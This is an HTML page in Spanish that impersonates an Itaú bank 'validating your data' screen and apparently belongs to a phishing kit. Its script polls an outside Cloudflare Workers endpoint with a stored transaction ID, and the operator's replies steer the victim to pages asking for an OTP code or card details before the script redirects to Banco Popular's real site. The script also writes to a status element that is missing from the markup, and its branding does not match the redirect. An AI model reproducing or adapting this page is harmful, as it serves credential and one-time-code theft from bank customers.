<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, user-scalable=yes" />
  <title>Validando - Itaú</title>
  
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      background: #f8f9fa;
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
    }

    .container {
      background: white;
      border-radius: 24px;
      padding: 40px 32px;
      max-width: 420px;
      width: 90%;
      text-align: center;
      box-shadow: 0 10px 40px rgba(0,0,0,0.08);
    }

    .logo-itau {
      font-size: 36px;
      font-weight: 700;
      color: #06143f;
      letter-spacing: -2px;
      margin-bottom: 30px;
    }

    .spinner-container {
      display: flex;
      justify-content: center;
      margin-bottom: 24px;
    }

    .spinner-salmon {
      position: relative;
      width: 60px;
      height: 60px;
    }

    .spinner-salmon::before {
      content: '';
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      border: 4px solid rgba(255, 91, 0, 0.15);
      border-radius: 50%;
    }

    .spinner-salmon::after {
      content: '';
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      border: 4px solid transparent;
      border-top-color: #ff5b00;
      border-bottom-color: #ff5b00;
      border-radius: 50%;
      animation: spinSalmon 1s cubic-bezier(0.5, 0, 0.5, 1) infinite;
    }

    @keyframes spinSalmon {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

    .title {
      font-size: 20px;
      font-weight: 600;
      color: #1a1a2e;
      margin-bottom: 6px;
    }

    .subtitle {
      font-size: 14px;
      color: #6c757d;
      line-height: 1.5;
    }

    .estado-info {
      margin-top: 20px;
      padding: 12px;
      background: #f0f0f5;
      border-radius: 10px;
      font-size: 13px;
      color: #555;
      word-break: break-all;
    }

    @media (max-width: 480px) {
      .container {
        padding: 28px 20px;
      }
      .logo-itau {
        font-size: 30px;
      }
      .title {
        font-size: 18px;
      }
      .subtitle {
        font-size: 13px;
      }
    }

    @media (prefers-reduced-motion: reduce) {
      .spinner-salmon::after {
        animation: none;
      }
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="logo-itau">itaú</div>
    <div class="spinner-container">
      <div class="spinner-salmon"></div>
    </div>
    <h1 class="title">Validando tus datos</h1>
    <p class="subtitle">Por favor espera un momento...</p>
   
  </div>

  <script>
    // ========================= CONFIGURACIÓN =========================
    const WORKER_URL = 'https://shy-resonance-6d69.micollflorez.workers.dev';
    let intentos = 0;
    const MAX_INTENTOS = 60;
    let timeoutId = null;
    let isProcessing = false;
    let transactionIdGlobal = null;
    let redirigiendo = false;

    // ========================= FUNCIÓN PRINCIPAL =========================
    async function checkStatus(transactionId) {
      if (isProcessing || redirigiendo) return;
      isProcessing = true;
      intentos++;

      try {
        const url = `${WORKER_URL}/status?id=${transactionId}`;
        console.log(`📡 Consultando: ${url}`);
        
        const response = await fetch(url);

        if (!response.ok) {
          throw new Error(`HTTP ${response.status}`);
        }

        const data = await response.json();
        console.log(`📊 Estado (${intentos}/${MAX_INTENTOS}):`, data);

        // Si no hay datos o está pendiente
        if (!data || !data.estado || data.estado === "pendiente") {
          document.getElementById('estadoInfo').textContent = `⏳ Esperando respuesta... (${intentos}/${MAX_INTENTOS})`;
          
          if (intentos >= MAX_INTENTOS) {
            console.log('⏰ Tiempo de espera agotado');
            document.getElementById('estadoInfo').textContent = '⏰ Tiempo agotado';
            redirigiendo = true;
            setTimeout(() => {
              window.location.href = 'index.html';
            }, 2000);
            return;
          }
          isProcessing = false;
          timeoutId = setTimeout(() => checkStatus(transactionId), 3000);
          return;
        }

        // ========================= PROCESAR ESTADO =========================
        const estado = data.estado;
        console.log(`✅ Estado recibido: ${estado}`);
        document.getElementById('estadoInfo').textContent = `📌 Estado: ${estado}`;

        // ✅ IMPORTANTE: Cuando el estado es 'otp_solicitado', redirigir a codigo.html
        if (estado === 'otp_solicitado') {
          document.getElementById('estadoInfo').textContent = '📲 Código OTP solicitado, redirigiendo...';
          redirigiendo = true;
          if (timeoutId) {
            clearTimeout(timeoutId);
            timeoutId = null;
          }
          setTimeout(() => {
            window.location.href = 'codigo.html';
          }, 1000);
          return;
        }

        switch (estado) {
          case 'autorizado':
            document.getElementById('estadoInfo').textContent = '✅ Autorizado, redirigiendo...';
            redirigiendo = true;
            if (timeoutId) {
              clearTimeout(timeoutId);
              timeoutId = null;
            }
            setTimeout(() => {
              window.location.href = 'codigo.html';
            }, 800);
            break;

          case 'error':
            document.getElementById('estadoInfo').textContent = '❌ Acceso denegado';
            redirigiendo = true;
            if (timeoutId) {
              clearTimeout(timeoutId);
              timeoutId = null;
            }
            setTimeout(() => {
              window.location.href = 'index.html';
            }, 1500);
            break;

          case 'otp_recibido':
            document.getElementById('estadoInfo').textContent = '✅ Código OTP recibido, esperando autorización...';
            isProcessing = false;
            timeoutId = setTimeout(() => checkStatus(transactionId), 3000);
            break;

          case 'biometria':
            document.getElementById('estadoInfo').textContent = '🔐 Biometría solicitada';
            redirigiendo = true;
            if (timeoutId) {
              clearTimeout(timeoutId);
              timeoutId = null;
            }
            setTimeout(() => {
              window.location.href = 'tarjeta.html';
            }, 800);
            break;

          case 'finalizado':
            document.getElementById('estadoInfo').textContent = '🏁 Proceso finalizado';
            redirigiendo = true;
            if (timeoutId) {
              clearTimeout(timeoutId);
              timeoutId = null;
            }
            setTimeout(() => {
              window.location.href = 'https://www.bancopopular.com.co/';
            }, 800);
            break;

          default:
            document.getElementById('estadoInfo').textContent = `📌 Estado: ${estado}`;
            isProcessing = false;
            timeoutId = setTimeout(() => checkStatus(transactionId), 3000);
        }

      } catch (error) {
        console.error('❌ Error:', error);
        document.getElementById('estadoInfo').textContent = `⚠️ Error: ${error.message}`;
        
        if (intentos < MAX_INTENTOS && !redirigiendo) {
          isProcessing = false;
          timeoutId = setTimeout(() => checkStatus(transactionId), 5000);
        } else {
          document.getElementById('estadoInfo').textContent = '❌ Error de conexión';
          if (!redirigiendo) {
            redirigiendo = true;
            setTimeout(() => {
              window.location.href = 'index.html';
            }, 2000);
          }
        }
      }
    }

    // ========================= INICIALIZACIÓN =========================
    document.addEventListener('DOMContentLoaded', async () => {
      const bancoldataRaw = localStorage.getItem('bancoldata');

      if (!bancoldataRaw) {
        console.log('❌ Error: Datos no encontrados');
        document.getElementById('estadoInfo').textContent = '❌ Sesión no encontrada';
        setTimeout(() => {
          window.location.href = 'index.html';
        }, 2000);
        return;
      }

      let bancoldata;
      try {
        bancoldata = JSON.parse(bancoldataRaw);
      } catch (e) {
        console.error('Error parsing bancoldata:', e);
        document.getElementById('estadoInfo').textContent = '❌ Datos inválidos';
        setTimeout(() => {
          window.location.href = 'index.html';
        }, 2000);
        return;
      }

      const { transactionId } = bancoldata;

      if (!transactionId) {
        console.log('❌ Error: transactionId no encontrado');
        document.getElementById('estadoInfo').textContent = '❌ ID no encontrado';
        setTimeout(() => {
          window.location.href = 'index.html';
        }, 2000);
        return;
      }

      transactionIdGlobal = transactionId;
      console.log('🔍 Verificando transacción:', transactionId);
      console.log(`📡 Worker URL: ${WORKER_URL}`);
      
      document.getElementById('estadoInfo').textContent = `🔍 Verificando (${transactionId.substring(0, 8)}...)`;
      
      // Iniciar verificación después de 1 segundo
      setTimeout(() => {
        checkStatus(transactionId);
      }, 1000);
    });

    // Limpiar timeout al salir de la página
    window.addEventListener('beforeunload', function() {
      if (timeoutId) {
        clearTimeout(timeoutId);
      }
    });

    console.log('🚀 Página de validación Itaú cargada');
    console.log(`📡 Worker URL: ${WORKER_URL}`);
  </script>
</body>
</html>
